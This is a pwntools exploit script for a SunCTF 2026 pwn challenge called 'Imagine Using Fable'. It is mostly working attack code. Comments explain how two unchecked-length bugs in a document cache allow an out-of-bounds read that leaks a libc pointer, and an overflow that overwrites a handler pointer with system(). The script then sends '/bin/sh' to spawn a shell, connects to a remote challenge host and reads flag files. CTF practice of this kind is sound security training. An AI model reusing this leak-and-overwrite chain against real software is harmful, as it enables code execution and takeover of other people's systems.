#!/usr/bin/env python3
# Imagine Using Fable - SunCTF 2026
#
# The "cache" is 6 fixed 0x38-byte documents at 0x404080 (non-PIE, .bss):
#   +0x00 handler fn ptr   +0x0c length   +0x10 buffer[0x28]
# and dlsym(NULL,"printf") is parked at 0x4041d0, right past doc5's buffer.
#
# Two bugs, both from lengths that are never checked against the 0x28 buffer:
#  1. L setlen[i,n] / P preview[i]: n is a raw u8 (0-255) stored as the length,
#     and preview write()s exactly that many bytes. len=48 on doc5 reads 8 bytes
#     past its buffer -> the dlsym printf pointer -> libc base.
#  2. D draw[i,decl,segs]: `decl` is bounded to 0x28, but each *segment* length
#     is an unchecked u8 and the "am I done" test happens only AFTER the read.
#     One 48-byte segment into doc4 overruns its buffer by 8 and lands exactly
#     on doc5's handler pointer.
#
# R render[i] then calls doc5.handler(doc5.buffer) -> system("/bin/sh").
import sys
from pwn import *

context.binary = ELF("./codec", checksec=False)
context.log_level = "info"
libc = ELF("./libc.so.6", checksec=False)

DOC = lambda i: 0x404080 + i * 0x38          # handler
BUF = lambda i: 0x404090 + i * 0x38          # buffer
PRINTF_SLOT = 0x4041D0                       # == BUF(5) + 0x28


def draw(io, idx, decl, seglen, data):
    io.send(b"D" + bytes([idx, decl, seglen]) + data)
    io.recvuntil(b"[drawn]\n")


def setlen(io, idx, n):
    io.send(b"L" + bytes([idx, n]))
    io.recvuntil(b"[ok]\n")


def preview(io, idx, n):
    io.send(b"P" + bytes([idx]))
    io.recvuntil(b"[preview] ")
    return io.recv(n)


def exploit(io):
    io.recvuntil(b"Q\n")

    n = PRINTF_SLOT - BUF(5) + 8              # 48: whole buffer + the pointer
    setlen(io, 5, n)
    leak = preview(io, 5, n)
    printf_ptr = u64(leak[-8:])
    libc.address = printf_ptr - libc.sym["printf"]
    log.success(f"printf       = {printf_ptr:#x}")
    log.success(f"libc base    = {libc.address:#x}")
    assert libc.address & 0xFFF == 0, "libc base not page-aligned - bad leak"

    # doc5.buffer <- "/bin/sh" (this is the argument render passes in rdi)
    draw(io, 5, 8, 8, b"/bin/sh\x00")

    # overflow doc4.buffer (0x28 bytes) by 8 -> doc5.handler
    pad = DOC(5) - BUF(4)                      # 40
    draw(io, 4, 1, pad + 8, b"A" * pad + p64(libc.sym["system"]))
    log.success(f"doc5.handler := system ({libc.sym['system']:#x})")

    io.send(b"R" + bytes([5]))
    return io


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        io = remote("fable.chal.sunwaycybersecurityclub.org", 9403)
    else:
        io = process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./codec"])
    exploit(io)
    io.sendline(b"id; cat flag* /flag* 2>/dev/null")
    io.interactive()
